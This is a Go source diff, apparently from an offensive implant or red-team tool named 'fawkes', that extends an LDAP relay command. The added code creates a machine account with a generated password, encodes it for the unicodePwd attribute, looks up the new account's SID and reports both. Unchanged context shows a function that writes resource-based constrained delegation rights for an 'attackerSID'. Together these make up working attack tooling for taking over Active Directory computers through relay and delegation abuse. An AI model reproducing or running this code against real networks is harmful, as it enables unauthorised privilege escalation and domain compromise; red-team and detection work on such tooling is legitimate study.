@@ -2,6 +2,7 @@ package commands
 
 import (
 	"context"
+	"crypto/rand"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -9,6 +10,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"unicode/utf16"
 
 	"fawkes/pkg/structs"
 
@@ -396,17 +398,48 @@ func ldapRelayAddComputer(conn *ldap.Conn, computerName string) string {
 	computerDN := fmt.Sprintf("CN=%s,CN=Computers,%s", dnName, baseDN)
 	dnsName := strings.ToLower(dnName) + "." + ldapRelayDNToDomain(baseDN)
 
+	password := generateComputerPassword()
+	unicodePwd := encodeUnicodePwd(password)
+
 	addReq := ldap.NewAddRequest(computerDN, nil)
 	addReq.Attribute("objectClass", []string{"Computer"})
 	addReq.Attribute("sAMAccountName", []string{samName})
 	addReq.Attribute("userAccountControl", []string{"4096"})
 	addReq.Attribute("dNSHostName", []string{dnsName})
+	addReq.Attribute("unicodePwd", []string{string(unicodePwd)})
 
 	err = conn.Add(addReq)
 	if err != nil {
 		return fmt.Sprintf("add-computer %s failed: %v", computerName, err)
 	}
-	return fmt.Sprintf("add-computer SUCCESS: created %s at %s", computerName, computerDN)
+
+	sid := ldapRelayQuerySID(conn, computerDN)
+	if sid != "" {
+		return fmt.Sprintf("add-computer SUCCESS: created %s at %s | password=%s | SID=%s", computerName, computerDN, password, sid)
+	}
+	return fmt.Sprintf("add-computer SUCCESS: created %s at %s | password=%s", computerName, computerDN, password)
+}
+
+func generateComputerPassword() string {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$"
+	buf := make([]byte, 16)
+	_, _ = rand.Read(buf)
+	pw := make([]byte, 16)
+	for i := range pw {
+		pw[i] = charset[int(buf[i])%len(charset)]
+	}
+	return string(pw)
+}
+
+func encodeUnicodePwd(password string) []byte {
+	quoted := "\"" + password + "\""
+	runes := utf16.Encode([]rune(quoted))
+	b := make([]byte, len(runes)*2)
+	for i, r := range runes {
+		b[i*2] = byte(r)
+		b[i*2+1] = byte(r >> 8)
+	}
+	return b
 }
 
 func ldapRelaySetRBCD(conn *ldap.Conn, targetDN, attackerSID string) string {
@@ -434,6 +467,20 @@ func ldapRelaySetRBCD(conn *ldap.Conn, targetDN, attackerSID string) string {
 		return fmt.Sprintf("rbcd modify failed: %v", err)
 	}
 	return fmt.Sprintf("rbcd SUCCESS: set msDS-AllowedToActOnBehalfOfOtherIdentity on %s", targetDN)
+}
+
+func ldapRelayQuerySID(conn *ldap.Conn, dn string) string {
+	sr, err := conn.Search(ldap.NewSearchRequest(
+		dn, ldap.ScopeBaseObject, ldap.NeverDerefAliases, 1, 10, false,
+		"(objectClass=*)", []string{"objectSid"}, nil))
+	if err != nil || len(sr.Entries) == 0 {
+		return ""
+	}
+	sidBytes := sr.Entries[0].GetRawAttributeValue("objectSid")
+	if len(sidBytes) == 0 {
+		return ""
+	}
+	return formatSID(sidBytes)
 }
 
 func ldapRelayDiscoverBaseDN(conn *ldap.Conn) (string, error) {
